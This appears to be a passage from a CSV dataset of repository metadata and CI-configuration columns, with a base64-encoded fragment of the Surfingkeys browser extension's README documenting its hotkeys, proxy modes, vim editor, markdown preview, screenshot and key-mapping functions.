name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
dCwgYEFsdC1zYCB3aWxsIHRvZ2dsZSBTdXJmaW5na2V5cyBmb3IgY3VycmVu
dCBzaXRlLiBXaGVuIFN1cmZpbmdrZXlzIGlzIHR1cm5lZCBvZmYsIGFsbCBt
YXBwaW5ncyBzdG9wIHdvcmtpbmcgZXhjZXB0IHRoZSBob3RrZXkuIFRvIGNo
YW5nZSBob3RrZXksIHVzZSBzZXR0aW5ncyBiZWxvdzoKCiAgICBtYXAoJzxD
dHJsLWk+JywgJzxBbHQtcz4nKTsgLy8gaG90a2V5IG11c3QgYmUgb25lIGtl
eXN0cm9rZSB3aXRoL3dpdGhvdXQgbW9kaWZpZXIsIGl0IGNhbiBub3QgYmUg
YSBzZXF1ZW5jZSBvZiBrZXlzdHJva2VzIGxpa2UgYGdnYC4KCldoZW4gU3Vy
ZmluZ2tleXMgaXMgdHVybmVkIG9mZiBvbiBzb21lIHNpdGUgYnkgYEFsdC1z
YCwgdGhlIHN0YXR1cyB3aWxsIGJlIHBlcnNpc3RlZCBpbiBzZXR0aW5ncywg
Zm9yIGV4YW1wbGUsCgogICAgImJsYWNrbGlzdCI6IHsKICAgICAgICAiaHR0
cHM6Ly9naXRodWIuY29tIjogMQogICAgfSwKCmBBbHQtc2Agb25jZSBtb3Jl
IHdpbGwgcmVtb3ZlIGl0IGZyb20gc2V0dGluZ3MuYmxhY2tsaXN0LiBUaGUg
ZGF0YSBzZXR0aW5ncyBhcmUgbm90IGFsd2F5cyBwcmVzZW50ZWQgaW4gc25p
cHBldHMsIHlvdSBjb3VsZCB1c2UgYHlqYCB0byBkdW1wIGFsbCBzZXR0aW5n
cyBpbnRvIGNsaXBib2FyZCwgdGhlbiBwYXN0ZSBpdCBpbiB5b3VyIHRleHQg
ZWRpdG9yIHRvIGNoZWNrIG91dC4KCkFub3RoZXIgd2F5IHRvIGRpc2FibGUg
U3VyZmluZ2tleXMgaXMgdG8gdXNlIGBzZXR0aW5ncy5ibGFja2xpc3RQYXR0
ZXJuYCwgcGxlYXNlIHJlZmVyIHRvIFtyZWdleCBmb3IgZGlzYWJsaW5nXSho
dHRwczovL2dpdGh1Yi5jb20vYnJvb2tob25nL1N1cmZpbmdrZXlzL2lzc3Vl
cy82MykuCgojIyBQcm94eSBzZXR0aW5ncwoKU3dpdGNoeVNoYXJwIGlzIGEg
Z3JlYXQgZXh0ZW5zaW9uIHRvIHN3aXRjaCBwcm94eSwgYnV0IG15IHVzZSBj
YXNlIHdpdGggaXQgaXMgdmVyeSBzaW1wbGUsCgoxLiBjcmVhdGUgYSBwcm9m
aWxlIHVzaW5nIFBBQyBzY3JpcHQuCjEuIG1haW50YWluIHNpdGUgbGlzdCBp
biB0aGUgUEFDIHNjcmlwdCwgdXNlIHByb3h5IGlmIHRoZSBzaXRlIGJlaW5n
IGFjY2Vzc2VkIGlzIGluIHRoZSBsaXN0LgoxLiB3aGVuZXZlciBJIGNvbWUg
aW50byBhIHNpdGUgYmxvY2tlZCBieSBzb21ldGhpbmcsIEkgYWRkIGl0IHRv
IHRoZSBsaXN0IGluIFBBQyBzY3JpcHQuCjEuIGNsaWNrIHRoZSBTd2l0Y2h5
U2hhcnAgaWNvbiB0byByZWxvYWQgdGhlIHByb2ZpbGUuCjEuIGNhc3VhbGx5
IEkgY2xpY2sgdGhlIFN3aXRjaHlTaGFycCBpY29uIHRvIHN3aXRjaCBwcm9m
aWxlIGJldHdlZW4gYGRpcmVjdGAgYW5kIGBwYWNfc2NyaXB0YC4KClRvIGF2
b2lkIG1hbnVhbGx5IGVkaXRpbmcgUEFDIHNjcmlwdCBhbmQgcmVsb2FkaW5n
L3N3aXRjaGluZyBwcm9maWxlIGJ5IGNsaWNraW5nIFN3aXRjaHlTaGFycCBp
Y29uLCBJIHJlcGxhY2VkIFN3aXRjaHlTaGFycCBieSBpbnRlZ3JhdGluZyBw
cm94eSBzZXR0aW5ncyBpbnRvIFN1cmZpbmdrZXlzLCBhbmQgcHJvdmlkZXMg
cmVsYXRlZCBjb21tYW5kcyBhbmQgc2hvcnRjdXRzLgoKKiBzZXRQcm94eSwg
dG8gc2V0IHByb3h5LCBzb21lIGV4YW1wbGVzOgoKICAgICAgICBzZXRQcm94
eSAxOTIuMTY4LjEuMTAwOjgwODAKICAgICAgICBzZXRQcm94eSAxMjcuMC4w
LjE6MTA4MCBTT0NLUzUKCiogc2V0UHJveHlNb2RlLCB0byBzZXQgcHJveHkg
bW9kZSwgdGhlcmUgYXJlIGZpdmUgbW9kZXM6IGRpcmVjdCwgYnlob3N0LCBi
eXBhc3MsIGFsd2F5cywgc3lzdGVtIGFuZCBjbGVhci4KCiAgICAgICAgZGly
ZWN0ICAgICAgQ2hyb21lIHdpbGwgY29ubmVjdCB0byBhbGwgc2l0ZXMgZGly
ZWN0bHkuCiAgICAgICAgYnlob3N0ICAgICAgQ2hyb21lIHdpbGwgb25seSBj
b25uZWN0IHRvIHNpdGVzIGFkZGVkIGJ5IGBhZGRQcm94eVNpdGVgIHRocm91
Z2ggcmVsYXRlZCBwcm94eS4gWW91IGNvdWxkIGFkZCBtdWx0aXBsZSBwYWly
cyBvZiBgcHJveHlgIGFuZCBgaG9zdHNgLCBmb3IgaG9zdHMgbWF0Y2hlZCB3
aXRoIGBob3N0c2AgYHByb3h5YCB3aWxsIGJlIHVzZWQuCiAgICAgICAgYnlw
YXNzICAgICAgQ2hyb21lIHdpbGwgY29ubmVjdCB0byBhbGwgc2l0ZXMgdGhy
b3VnaCBwcm94eSwgd2l0aCBzcGVjaWZpZWQgaG9zdHMgZXhjbHVkZWQuCiAg
ICAgICAgYWx3YXlzICAgICAgQ2hyb21lIHdpbGwgY29ubmVjdCB0byBhbGwg
c2l0ZXMgdGhyb3VnaCBwcm94eS4KICAgICAgICBzeXN0ZW0gICAgICBVc2Ug
cHJveHkgY29uZmlndXJhdGlvbiB0YWtlbiBmcm9tIHRoZSBvcGVyYXRpbmcg
c3lzdGVtLgogICAgICAgIGNsZWFyICAgICAgIFN1cmZpbmdrZXlzIHdpbGwg
bm90IHRha2UgY29udHJvbCBvZiBwcm94eSBzZXR0aW5ncywgdGhpcyBpcyB0
aGUgZGVmYXVsdCBtb2RlLgoKKiBhZGRQcm94eVNpdGUsIHJlbW92ZVByb3h5
U2l0ZSwgdG9nZ2xlUHJveHlTaXRlLCB0byBtYWtlIENocm9tZSBjb25uZWN0
IHRvIHNpdGUgdGhyb3VnaCBwcm94eSBvciBub3QsIGV4YW1wbGVzOgoKICAg
ICAgICBhZGRQcm94eVNpdGUgZ29vZ2xlLmNvbSxmYWNlYm9vay5jb20sdHdp
dHRlci5jb20KCiogcHJveHlJbmZvLCB0byBsaXN0IHByb3h5IHlvdSBzZXQg
YnkgYHNldFByb3h5YCwgcHJveHkgbW9kZSB5b3Ugc2V0IGJ5IGBzZXRQcm94
eU1vZGVgIGFuZCBzaXRlcyB5b3UgYWRkL3JlbW92ZSBieSBgYWRkUHJveHlT
aXRlYC9gcmVtb3ZlUHJveHlTaXRlYC9gdG9nZ2xlUHJveHlTaXRlYC4KCiog
YGNwYCwgdG9nZ2xlIHByb3h5IGZvciBjdXJyZW50IHNpdGUuCgoqIGBzcGFg
LCBzaG9ydGN1dCBmb3IgYDpzZXRQcm94eU1vZGUgYWx3YXlzYAoKKiBgc3Bi
YCwgc2hvcnRjdXQgZm9yIGA6c2V0UHJveHlNb2RlIGJ5aG9zdGAKCiogYHNw
Y2AsIHNob3J0Y3V0IGZvciBgOnNldFByb3h5TW9kZSBjbGVhcmAKCiogYHNw
ZGAsIHNob3J0Y3V0IGZvciBgOnNldFByb3h5TW9kZSBkaXJlY3RgCgoqIGBz
cHNgLCBzaG9ydGN1dCBmb3IgYDpzZXRQcm94eU1vZGUgc3lzdGVtYAoKKiBg
c3BpYCwgc2hvcnRjdXQgZm9yIGA6cHJveHlJbmZvYAoKIyMgVklNIGVkaXRv
ciBhbmQgRW1hY3MgZWRpdG9yCgpUaGFua3MgQUNFIGZvciB0aGUgdmltIGVk
aXRvciwgU3VyZmluZ2tleXMgaW50ZWdyYXRlcyBBQ0UgZm9yIHRoZSB2aW0g
ZWRpdG9yLiBUaGUgdmltIGVkaXRvciBpcyB1c2VkOgoKKiB0byBlZGl0IGFu
eSBpbnB1dCBvbiBodG1sIHBhZ2UKKiB0byBlZGl0IFVSTCB0byBvcGVuIGlu
IG5ldyB0YWIKKiB0byBlZGl0IHNldHRpbmdzCgpZb3UgY291bGQgY2hhbmdl
IHRvIEVtYWNzIGtleWJpbmRpbmdzIGZvciB0aGUgZWRpdG9yIGJ5IGFkZGlu
ZyBiZWxvdyBzZXR0aW5nczoKCiAgICBzZXR0aW5ncy5hY2VLZXliaW5kaW5n
cyA9ICJlbWFjcyI7CgpXaXRoIEVtYWNzIGtleWJpbmRpbmdzLCB1c2UgYEMt
eCBDLXNgIHRvIHNhdmUgeW91ciBpbnB1dC4KCiMjIyBFZGl0IGFueSBpbnB1
dCBvbiBodG1sIHBhZ2UKCkluIG5vcm1hbCBtb2RlLCBwcmVzcyBjYXBpdGFs
IGBJYCwgdGhlbiB1c2UgYSBoaW50IGxldHRlciB0byBwaWNrIHVwIGEgaW5w
dXQgYm94LiBBIHZpbSBlZGl0b3IgaXMgb3BlbmVkIGZvciB5b3UgdG8gZWRp
dCB0ZXh0LiBUaGUgdmltIGVkaXRvciBpcyBvcGVuZWQgaW4gc2xpZ2h0bHkg
ZGlmZmVyZW50IHdheSBmb3IgYDxpbnB1dD5gLCBgPHRleHRhcmVhPmAsIGFu
ZCBgPHNlbGVjdD5gIGVsZW1lbnRzLgoKRm9yIGA8aW5wdXQ+YCBlbGVtZW50
cywgdGhlIHZpbSBlZGl0b3IgaGFzIG9ubHkgb25lIGxpbmUsIGFuZCB5b3Ug
dXNlIHZpbSBrZXkgYmluZGluZ3MgdG8gZWRpdCB5b3VyIHRleHQuIFRoZW4g
cHJlc3MgYEVudGVyYCBvciBgOndgIHRvIHdyaXRlIHlvdXIgdGV4dCBiYWNr
IHRvIHRoZSBgPGlucHV0PmAgZWxlbWVudC4KCiFbaW5wdXRfd2l0aF92aW1d
KGh0dHBzOi8vY2xvdWQuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fzc2V0cy8y
ODgyMDcvMTc2NDQyMTkvNzVhNzJiMmUtNjFiMy0xMWU2LThjZTItMDZjOWNj
OTRhZWNhLmdpZikKCkZvciBgPHRleHRhcmVhPmAgZWxlbWVudHMsIHRoZSB2
aW0gZWRpdG9yIGlzIG9wZW5lZCBpbiBiaWdnZXIgc2l6ZS4gQWZ0ZXIgeW91
IGNvbXBsZXRlIHlvdXIgZWRpdHMsIHByZXNzIGBDdHJsLUVudGVyYCBvciBg
OndgIHRvIHdyaXRlIHlvdXIgdGV4dCBiYWNrIHRvIHRoZSBgPHRleHRhcmVh
PmAgZWxlbWVudC4KCiFbdGV4dGFyZWFfd2l0aF92aW1dKGh0dHBzOi8vY2xv
dWQuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fzc2V0cy8yODgyMDcvMTc2NDQy
MTcvNzVhMjdlNDQtNjFiMy0xMWU2LThmMjEtOWNkNzlkM2M1Nzc2LmdpZikK
CkZvciBgPHNlbGVjdD5gIGVsZW1lbnRzLCB0aGUgdmltIGVkaXRvciBpcyBh
Z2FpbiBvcGVuZWQgaW4gYmlnZ2VyIHNpemUuIEluc3RlYWQgb2YgZWRpdGlu
ZyB0aGUgdGV4dCwgc2VhcmNoIGZvciB0aGUgZGVzaXJlZCBvcHRpb24gYW5k
IGp1bXAgdG8gdGhlIGxpbmUsIHRoZW4gcHJlc3MgYEVudGVyYCB0byBzZWxl
Y3QgaXQuIFRoaXMgaXMgaGFuZHkgZm9yIGA8c2VsZWN0PmAgZWxlbWVudHMg
d2hpY2ggaGF2ZSBsb3RzIG9mIG9wdGlvbnMuCgohW3NlbGVjdF93aXRoX3Zp
bV0oaHR0cHM6Ly9jbG91ZC5naXRodWJ1c2VyY29udGVudC5jb20vYXNzZXRz
LzI4ODIwNy8xNzY0NDIxOC83NWE0NThhNC02MWIzLTExZTYtOGNlNy1lZWRj
Yzk5Njc0NWMuZ2lmKQoKYEVzY2Agb3IgYDpxYCB0byBxdWl0IHZpbSBlZGl0
b3Igd2l0aG91dCB3cml0aW5nIHRleHQgYmFjay4KCmBUYWJgIGNvbXBsZXRp
b24gd29ya3Mgd2l0aCBhbGwgd29yZHMgb24gY3VycmVudCBwYWdlLCBgU3Bh
Y2VgIHRvIGNob29zZSBhIG1hdGNoIGZyb20gcG9wdXAuCgpJZiB5b3UgZW50
ZXIgaW5zZXJ0IG1vZGUgd2l0aCBgaWAgb3IgbW91c2UgY2xpY2ssIHlvdSB3
aWxsIGVkaXQgeW91ciBpbnB1dCBpbiBub3JtYWwgd2F5LiBZb3UgY291bGQg
YWxzbyBvcGVuIHZpbSBlZGl0b3IgYXQgdGhhdCB0aW1lIGJ5IHByZXNzaW5n
IGBDdHJsLWlgLgoKUmVtZW1iZXIgdGhhdCBpbiBpbnNlcnQgbW9kZSwgcHJl
c3MgYEN0cmwtaWAgdG8gb3BlbiB0aGUgdmltIGVkaXRvci4KCiMjIyBFZGl0
IFVSTCB0byBvcGVuIGluIG5ldyB0YWIKCmBzdWAgdG8gb3BlbiB2aW0gZWRp
dG9yIHRvIGVkaXQgY3VycmVudCBVUkwsIHRoZW4gYEVudGVyYCBvciBgOndg
IHRvIG9wZW4gdGhlIGlucHV0IFVSTCwgd2hpY2ggd29ya3MganVzdCBsaWtl
IGFkZHJlc3MgYmFyIHdpdGggdmltLWJpbmRpbmcga2V5cy4KCmBUYWJgIGNv
bXBsZXRpb24gd29ya3Mgd2l0aCBhbGwgVVJMcyBmcm9tIGJvb2ttYXJrL2hp
c3RvcnksIGBTcGFjZWAgdG8gY2hvb3NlIGEgbWF0Y2ggZnJvbSBwb3B1cC4K
CiFbdXJsX3dpdGhfdmltXShodHRwczovL2Nsb3VkLmdpdGh1YnVzZXJjb250
ZW50LmNvbS9hc3NldHMvMjg4MjA3LzE3NjQ0MjIwLzc1ZjhlZWRjLTYxYjMt
MTFlNi05NjMwLWRhMjI1MGFjNWYxMC5naWYpCgojIyMgRWRpdCBzZXR0aW5n
cwoKYHNlYCB0byBvcGVuIHNldHRpbmdzIGVkaXRvciwgYDp3YCB0byBzYXZl
IHNldHRpbmdzLgoKIyMgRG90IHRvIHJlcGVhdCBwcmV2aW91cyBhY3Rpb24K
CltSZXBlYXRpbmcgcHJldmlvdXMgYWN0aW9uc10oaHR0cHM6Ly9naXRodWIu
Y29tL2Jyb29raG9uZy9TdXJmaW5na2V5cy9pc3N1ZXMvNjcpCgpBbGwga2V5
c3Ryb2tlcyBpbiBub3JtYWwgbW9kZSBhcmUgcmVwZWF0YWJsZSBieSBkb3Qs
IGV4Y2VwdCB0aG9zZSBrZXlzdHJva2VzIG1hcHBlZCB3aXRoIGByZXBlYXRJ
Z25vcmVgIGFzIGB0cnVlYCwgZm9yIGV4YW1wbGUsCgogICAgbWFwa2V5KCdl
JywgJyMyU2Nyb2xsIGEgcGFnZSB1cCcsIGZ1bmN0aW9uKCkgewogICAgICAg
IE5vcm1hbC5zY3JvbGwoInBhZ2VVcCIpOwogICAgfSwge3JlcGVhdElnbm9y
ZTogdHJ1ZX0pOwoKVGhlbiBgLmAgd2lsbCBub3QgcmVwZWF0IGFjdGlvbiB0
byBwYWdlIHVwLCBldmVuIGBlYCBpcyBqdXN0IHByZXNzZWQuCgojIyBNYXJr
ZG93biBwcmV2aWV3CgoxLiBjb3B5IHlvdXIgbWFya2Rvd24gc291cmNlIGlu
dG8gY2xpcGJvYXJkLgoxLiBgc21gIHRvIG9wZW4gbWFya2Rvd24gcHJldmll
dywgd2hpY2ggd2lsbCBwcmV2aWV3IG1hcmtkb3duIGZyb20gY2xpcGJvYXJk
LgoxLiBUaGVuIG9uIHRoZSBwcmV2aWV3IHBhZ2UsIGFub3RoZXIgYHNtYCB3
aWxsIG9wZW4gdmltIGVkaXRvciB0byBlZGl0IG1hcmtkb3duIHNvdXJjZS4K
MS4gYDp3cWAgdG8gcmVmcmVzaCBwcmV2aWV3LgoxLiBgcmAgdG8gcmVsb2Fk
IG1hcmtkb3duIHNvdXJjZSBmcm9tIGNsaXBib2FyZC4KCiFbbWFya2Rvd25d
KGh0dHBzOi8vY2xvdWQuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fzc2V0cy8y
ODgyMDcvMTc2Njk4OTcvMGI2ZmJhZjYtNjM0Mi0xMWU2LTg1ODMtODZlYjg2
OTExOTBkLmdpZikKCkJ5IGRlZmF1bHQsIFN1cmZpbmdrZXlzIHVzZXMgdGhp
cyBbbWFya2Rvd24gcGFyc2VyXShodHRwczovL2dpdGh1Yi5jb20vY2hqai9t
YXJrZWQpIHRvIHByZXZpZXcgbWFya2Rvd24sIGlmIHlvdSdkIGxpa2UgdG8g
dXNlIFtnaXRodWIgbWFya2Rvd24gQVBJXShodHRwczovL2RldmVsb3Blci5n
aXRodWIuY29tL3YzL21hcmtkb3duLykgdG8gcGFyc2UgeW91ciBtYXJrZG93
biwgcGxlYXNlIGFkZCBiZWxvdyBsaW5lIHRvIHlvdXIgc2V0dGluZ3M6Cgog
ICAgc2V0dGluZ3MudXNlTG9jYWxNYXJrZG93bkFQSSA9IGZhbHNlOwoKIyMg
Q2FwdHVyZSBwYWdlCgpUaGVyZSBhcmUgc29tZSBjaXJjdW1zdGFuY2VzIHRo
YXQgeW91IHdhbnQgdG8gdGFrZSBhIHNjcmVlbnNob3Qgb24gYSBwYWdlLCBi
ZWxvdyBzaG9ydGN1dHMgY291bGQgaGVscCB5b3UsIGVzcGVjaWFsbHkgd2hl
biBpdCBpcyBmb3IgYSBsb25nIHBhZ2Ugb3IganVzdCBmb3Igc29tZSBzY3Jv
bGxhYmxlIERJViBvbiB0aGUgcGFnZS4KCiogYHlnYCB0byBjYXB0dXJlIGN1
cnJlbnQgcGFnZS4KKiBgeUdgIHRvIGNhcHR1cmUgY3VycmVudCBmdWxsIHBh
Z2UgaWYgaXQgaXMgc2Nyb2xsYWJsZS4KKiBgeVNgIHRvIGNhcHR1cmUgY3Vy
cmVudCBzY3JvbGwgdGFyZ2V0LgoKQWZ0ZXIgb25lIG9mIGFib3ZlIHNob3J0
Y3V0cyBwcmVzc2VkLCB5b3UgY291bGQgc2VlIGEgcG9wdXAgb2YgY2FwdHVy
ZWQgaW1hZ2UsIG9uIHdoaWNoIHlvdSBjb3VsZCB0aGVuIHJpZ2h0IGNsaWNr
IHdpdGggYSBNT1VTRSgg8J+YoiApIHRvIHNhdmUgYXMgb3IgY29weSBpbnRv
IHN5c3RlbSBjbGlwYm9hcmQuCgojIyBNZXJtYWlkIGRpYWdyYW0gZ2VuZXJh
dG9yCgpbTWVybWFpZF0oaHR0cHM6Ly9naXRodWIuY29tL2tuc3YvbWVybWFp
ZCkgaXMgYSBncmVhdCB0b29sIHRvIGdlbmVyYXRlIGRpYWdyYW1zIGFuZCBm
bG93Y2hhcnRzIGZyb20gdGV4dCBpbiBhIHNpbWlsYXIgbWFubmVyIGFzIG1h
cmtkb3duLgpTdXJmaW5na2V5cyBwcm92aWRlcyBhIHNpbXBsZSBmcm9udGVu
ZCB0byBnZW5lcmF0ZSBkaWFncmFtcyBmcm9tIHRleHQgaW4gY2xpcGJvYXJk
LCBhbmQgYSB2aW0gZWRpdG9yIHRvIGVkaXQgaXQuCgpgQ3RybC1BbHQtZGAg
dG8gb3BlbiBpdC4KCiMjIFBERiB2aWV3ZXIKVG8gbWFrZSBTdXJmaW5na2V5
cyB3b3JrIGZvciBQREYgZmlsZXMsIFN1cmZpbmdrZXlzIGludGVncmF0ZXMg
UERGIHZpZXdlciBmcm9tIHRoZSBub3RhYmxlIFtwZGYuanNdKGh0dHBzOi8v
Z2l0aHViLmNvbS9tb3ppbGxhL3BkZi5qcykuIFdoZW4gYSBwZGYgZmlsZSBp
cyBvcGVuZWQgaW4gQ2hyb21lLCB0aGUgUERGIHZpZXdlciB3aWxsIGJlIGxh
dW5jaGVkLCBhbmQgeW91IGNvdWxkIHVzZSBldmVyeXRoaW5nIGZyb20gU3Vy
ZmluZ2tleXMgdGhlbi4KCklmIHlvdSB3b3VsZCBsaWtlIHRvIHVzZSBvcmln
aW5hbCBwZGYgdmlld2VyIHByb3ZpZGVkIGJ5IENocm9tZSBpdHNlbGYsIHVz
ZSBgO3NgIHRvIHRvZ2dsZSB0aGF0LgoKU29tZSBmdW5jdGlvbmFsaXRpZXMg
YXJlIGFsc28gYXZhaWxhYmxlIHdoZW4geW91J3JlIHVzaW5nIG9yaWdpbmFs
IHBkZiB2aWV3ZXIsIGJ1dCBzb21lIGZ1bmN0aW9uYWxpdGllcyBzdWNoIGFz
IHNtb290aCBzY3JvbGwvdmlzdWFsIG1vZGUgZXRjIHdvbid0IGJlIGF2YWls
YWJsZS4KCiMjIEVkaXQgeW91ciBvd24gc2V0dGluZ3MKCiMjIyBNYXAgYSBr
ZXlzdHJva2UgdG8gc29tZSBhY3Rpb24KCiAgICBtYXBrZXkoa2V5c3Ryb2tl
LCBoZWxwX3N0cmluZywgYWN0aW9uX2NvZGUsIFtvcHRpb25zXSkKCnwgcGFy
YW1ldGVyICB8IGV4cGxhbmF0aW9uIHwKfDotLS0tLS0tLS0tLS0tLS18IDot
LS0tLXwKfCoqa2V5c3Ryb2tlKiogICAgICAgICAgICAgICAgICAgfCBzdHJp
bmcsIGFueSBrZXlzdHJva2UgdG8gdHJpZ2dlciB0aGUgYWN0aW9ufAp8Kipo
ZWxwX3N0cmluZyoqICAgICAgICAgICAgICAgICB8IHN0cmluZywgYSBoZWxw
IG1lc3NhZ2UgdG8gZGVzY3JpYmUgdGhlIGFjdGlvbiwgd2hpY2ggd2lsbCBk
aXNwbGF5ZWQgaW4gaGVscCBvcGVuZWQgYnkgYHVgLnwKfCoqYWN0aW9uX2Nv
ZGUqKiAgICAgICAgICAgICAgICAgfCBmdW5jdGlvbiwgYSBKYXZhc2NyaXB0
IGZ1bmN0aW9uIHRvIGJlIGJvdW5kLiBJZiB0aGUgZnVuY3Rpb24gbmVlZHMg
YW4gYXJndW1lbnQsIG5leHQgcHJlc3NlZCBrZXkgd2lsbCBiZSBmZWQgdG8g
dGhlIGZ1bmN0aW9uLnwKfCoqb3B0aW9ucyoqICAgICAgICAgICAgICAgICAg
ICAgfCBvYmplY3QsIHByb3BlcnRpZXMgbGlzdGVkIGJlbG93fAp8Kipkb21h
aW4qKiAgICAgICAgICAgICAgICAgICAgICB8IHJlZ2V4W29wdGlvbmFsXSwg
YSBKYXZhc2NyaXB0IHJlZ2V4IHBhdHRlcm4gdG8gaWRlbnRpZnkgdGhlIGRv
bWFpbnMgdGhhdCB0aGlzIG1hcHBpbmcgd29ya3MsIGZvciBleGFtcGxlLCBg
L2dpdGh1YlwuY29tL2lgIHNheXMgdGhhdCB0aGlzIG1hcHBpbmcgd29ya3Mg
b25seSBmb3IgZ2l0aHViLmNvbS58CnwqKnJlcGVhdElnbm9yZSoqICAgICAg
ICAgICAgICAgIHwgYm9vbGVhbltvcHRpb25hbF0sIHdoZXRoZXIgdGhpcyBr
ZXlzdHJva2Ugd2lsbCBiZSByZXBlYXQgYnkgZG90IGNvbW1hbmQufAoKSnVz
dCBhbiBleGFtcGxlIHRvIG1hcCBvbmUga2V5c3Ryb2tlIHRvIGRpZmZlcmVu
dCBmdW5jdGlvbnMgb24gZGlmZmVyZW50IHNpdGVzLAoKICAgIG1hcGtleSgn
enonLCAnQ2hvb3NlIGEgdGFiJywgZnVuY3Rpb24oKSB7CiAgICAgICAgRnJv
bnQuY2hvb3NlVGFiKCk7CiAgICB9LCB7ZG9tYWluOiAvZ2l0aHViXC5jb20v
aX0pOwogICAgbWFwa2V5KCd6eicsICdTaG93IHVzYWdlJywgZnVuY3Rpb24o
KSB7CiAgICAgICAgRnJvbnQuc2hvd1VzYWdlKCk7CiAgICB9LCB7ZG9tYWlu
OiAvZ29vZ2xlXC5jb20vaX0pOwoKbWFwa2V5IGluIHZpc3VhbCBtb2RlIGFu
ZCBvbW5pYmFyIGJhci4KCiAgICB2bWFwa2V5KGtleXN0cm9rZSwgaGVscF9z
dHJpbmcsIGFjdGlvbl9jb2RlLCBbb3B0aW9uc10pCgojIyMgbWFwIGEga2V5
c3Ryb2tlIHRvIGFub3RoZXIKCiAgICBtYXAobmV3X2tleXN0cm9rZSwgb2xk
X2tleXN0cm9rZSwgW2RvbWFpbl9wYXR0ZXJuXSwgW25ld19hbm5vdGF0aW9u
XSkKCiAgICBpbWFwKG5ld19rZXlzdHJva2UsIG9sZF9rZXlzdHJva2UsIFtk
b21haW5fcGF0dGVybl0sIFtuZXdfYW5ub3RhdGlvbl0pCgogICAgdm1hcChu
ZXdfa2V5c3Ryb2tlLCBvbGRfa2V5c3Ryb2tlLCBbZG9tYWluX3BhdHRlcm5d
LCBbbmV3X2Fubm90YXRpb25dKQoKICAgIGNtYXAobmV3X2tleXN0cm9rZSwg
b2xkX2tleXN0cm9rZSwgW2RvbWFpbl9wYXR0ZXJuXSwgW25ld19hbm5vdGF0
aW9uXSkKCnwgcGFyYW1ldGVyICB8IGV4cGxhbmF0aW9uIHwKfDotLS0tLS0t
LS0tLS0tLS18IDotLS0tLXwKfCoqbmV3X2tleXN0cm9rZSoqICAgICAgICAg
ICAgICAgfCBzdHJpbmcsIHRoZSBuZXcga2V5c3Ryb2tlIHRoYXQgd2lsbCBi
ZSB1c2VkLnwKfCoqb2xkX2tleXN0cm9rZSoqICAgICAgICAgICAgICAgfCBz
dHJpbmcsIHRoZSBleGlzdGluZyBrZXlzdHJva2UgdGhhdCB3aWxsIGJlIHJl
cGxhY2VkLCB3aGljaCBtZWFucyBwcmVzc2luZyBpdCB3aWxsIG5vdCB0cmln
Z2VyIGFueSBhY3Rpb24ufAp8Kipkb21haW5fcGF0dGVybioqICAgICAgICAg
ICAgICB8IHJlZ2V4W29wdGlvbmFsXSwgYSBKYXZhc2NyaXB0IHJlZ2V4IHBh
dHRlcm4gdG8gaWRlbnRpZnkgdGhlIGRvbWFpbnMgdGhhdCB0aGlzIG1hcHBp
bmcgd29ya3MufAp8KipuZXdfYW5ub3RhdGlvbioqICAgICAgICAgICAgICB8
IHN0cmluZ1tvcHRpb25hbF0sIHVzZSBpdCBpbnN0ZWFkIG9mIHRoZSBhbm5v
dGF0aW9uIGZyb20gb2xkX2tleXN0cm9rZSBpZiBwcm92aWRlZC58CgojIyMg
